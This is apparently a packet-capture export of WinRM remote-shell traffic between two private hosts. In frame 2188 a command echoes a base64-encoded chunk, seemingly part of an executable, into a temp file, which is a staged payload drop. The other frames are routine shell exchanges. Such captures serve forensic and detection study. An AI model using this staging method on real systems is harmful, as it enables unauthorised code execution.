frame.number	ip.src	tcp.srcport	ip.dst	tcp.dstport	http.file_data
2188	192.168.1.3	39517	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:53af863a-0d2a-6834-209f-d1839010a156</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</a:Action><w:OptionSet><w:Option Name="WINRS_CONSOLEMODE_STDIN">TRUE</w:Option><w:Option Name="WINRS_SKIP_CMD_SHELL">FALSE</w:Option></w:OptionSet><w:SelectorSet><w:Selector Name="ShellId">768A9852-B4AF-4175-BD69-1EB4E40B0934</w:Selector></w:SelectorSet>\n    </env:Header>\n     <env:Body>\n      <rsp:CommandLine>\n        <rsp:Command>&quot;echo 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>>%TEMP%\QvnxI.b64&quot;</rsp:Command>\n      </rsp:CommandLine>\n    </env:Body></env:Envelope>\n    
2190	192.168.2.2	5985	192.168.1.3	39517	<s:Envelope xml:lang="en-US" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/CommandResponse</a:Action><a:MessageID>uuid:6219877C-2A0D-456C-A6F3-DCFABDA91C04</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:53af863a-0d2a-6834-209f-d1839010a156</a:RelatesTo></s:Header><s:Body><rsp:CommandResponse><rsp:CommandId>89198639-911C-4F9C-8A81-815D00306681</rsp:CommandId></rsp:CommandResponse></s:Body></s:Envelope>
2198	192.168.1.3	35143	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:d5e3a4a9-9aea-5f67-431e-7ada7c962812</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive</a:Action><w:SelectorSet><w:Selector Name="ShellId">768A9852-B4AF-4175-BD69-1EB4E40B0934</w:Selector></w:SelectorSet>\n    </env:Header>\n    <env:Body>\n      <rsp:Receive>\n        <rsp:DesiredStream CommandId="89198639-911C-4F9C-8A81-815D00306681">stdout stderr</rsp:DesiredStream>\n      </rsp:Receive>\n    </env:Body></env:Envelope>\n    
2200	192.168.2.2	5985	192.168.1.3	35143	
2206	192.168.1.3	38351	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:d5e3a4a9-9aea-5f67-431e-7ada7c962812</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive</a:Action><w:SelectorSet><w:Selector Name="ShellId">768A9852-B4AF-4175-BD69-1EB4E40B0934</w:Selector></w:SelectorSet>\n    </env:Header>\n    <env:Body>\n      <rsp:Receive>\n        <rsp:DesiredStream CommandId="89198639-911C-4F9C-8A81-815D00306681">stdout stderr</rsp:DesiredStream>\n      </rsp:Receive>\n    </env:Body></env:Envelope>\n    
2208	192.168.2.2	5985	192.168.1.3	38351	<s:Envelope xml:lang="en-US" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/ReceiveResponse</a:Action><a:MessageID>uuid:2F06679A-6230-4794-B526-18270A4DA606</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:d5e3a4a9-9aea-5f67-431e-7ada7c962812</a:RelatesTo></s:Header><s:Body><rsp:ReceiveResponse><rsp:CommandState CommandId="89198639-911C-4F9C-8A81-815D00306681" State="http://schemas.microsoft.com/wbem/wsman/1/windows/shell/CommandState/Done"><rsp:ExitCode>0</rsp:ExitCode></rsp:CommandState></rsp:ReceiveResponse></s:Body></s:Envelope>
2216	192.168.1.3	43529	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:cf6b250a-22a2-319b-c08f-5dcc353290f0</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Signal</a:Action><w:SelectorSet><w:Selector Name="ShellId">768A9852-B4AF-4175-BD69-1EB4E40B0934</w:Selector></w:SelectorSet>\n    </env:Header>\n     <env:Body>\n      <rsp:Signal CommandId="89198639-911C-4F9C-8A81-815D00306681">\n        <rsp:Code>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/signal/terminate</rsp:Code>\n      </rsp:Signal>\n    </env:Body></env:Envelope>\n    
2218	192.168.2.2	5985	192.168.1.3	43529	
2224	192.168.1.3	36885	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:cf6b250a-22a2-319b-c08f-5dcc353290f0</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Signal</a:Action><w:SelectorSet><w:Selector Name="ShellId">768A9852-B4AF-4175-BD69-1EB4E40B0934</w:Selector></w:SelectorSet>\n    </env:Header>\n     <env:Body>\n      <rsp:Signal CommandId="89198639-911C-4F9C-8A81-815D00306681">\n        <rsp:Code>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/signal/terminate</rsp:Code>\n      </rsp:Signal>\n    </env:Body></env:Envelope>\n    
2226	192.168.2.2	5985	192.168.1.3	36885	<s:Envelope xml:lang="en-US" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/SignalResponse</a:Action><a:MessageID>uuid:58F738CB-5F3A-4240-A789-7FDCD954DA48</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:cf6b250a-22a2-319b-c08f-5dcc353290f0</a:RelatesTo></s:Header><s:Body><rsp:SignalResponse/></s:Body></s:Envelope>
2234	192.168.1.3	39749	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:d3b529af-c3a2-a87e-195d-da244ea200ee</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete</a:Action><w:SelectorSet><w:Selector Name="ShellId">768A9852-B4AF-4175-BD69-1EB4E40B0934</w:Selector></w:SelectorSet>\n    </env:Header>\n    <env:Body/></env:Envelope>\n    
2236	192.168.2.2	5985	192.168.1.3	39749	
2242	192.168.1.3	42769	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:d3b529af-c3a2-a87e-195d-da244ea200ee</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete</a:Action><w:SelectorSet><w:Selector Name="ShellId">768A9852-B4AF-4175-BD69-1EB4E40B0934</w:Selector></w:SelectorSet>\n    </env:Header>\n    <env:Body/></env:Envelope>\n    
2244	192.168.2.2	5985	192.168.1.3	42769	<s:Envelope xml:lang="en-US" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.xmlsoap.org/ws/2004/09/transfer/DeleteResponse</a:Action><a:MessageID>uuid:FE6BC50E-2361-4013-958E-6CBF3DA415C1</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:d3b529af-c3a2-a87e-195d-da244ea200ee</a:RelatesTo></s:Header><s:Body></s:Body></s:Envelope>
2252	192.168.1.3	37509	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:27fd05b3-57eb-1f71-ffe4-6af25d1f1ff9</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action><w:OptionSet><w:Option Name="WINRS_NOPROFILE">FALSE</w:Option><w:Option Name="WINRS_CODEPAGE">437</w:Option></w:OptionSet>\n    </env:Header>\n    <env:Body>\n      <rsp:Shell>\n    <rsp:InputStreams>stdin</rsp:InputStreams>\n    <rsp:OutputStreams>stdout stderr</rsp:OutputStreams>\n    </rsp:Shell>\n    </env:Body></env:Envelope>\n    
2254	192.168.2.2	5985	192.168.1.3	37509	
2260	192.168.1.3	45281	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:27fd05b3-57eb-1f71-ffe4-6af25d1f1ff9</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action><w:OptionSet><w:Option Name="WINRS_NOPROFILE">FALSE</w:Option><w:Option Name="WINRS_CODEPAGE">437</w:Option></w:OptionSet>\n    </env:Header>\n    <env:Body>\n      <rsp:Shell>\n    <rsp:InputStreams>stdin</rsp:InputStreams>\n    <rsp:OutputStreams>stdout stderr</rsp:OutputStreams>\n    </rsp:Shell>\n    </env:Body></env:Envelope>\n    
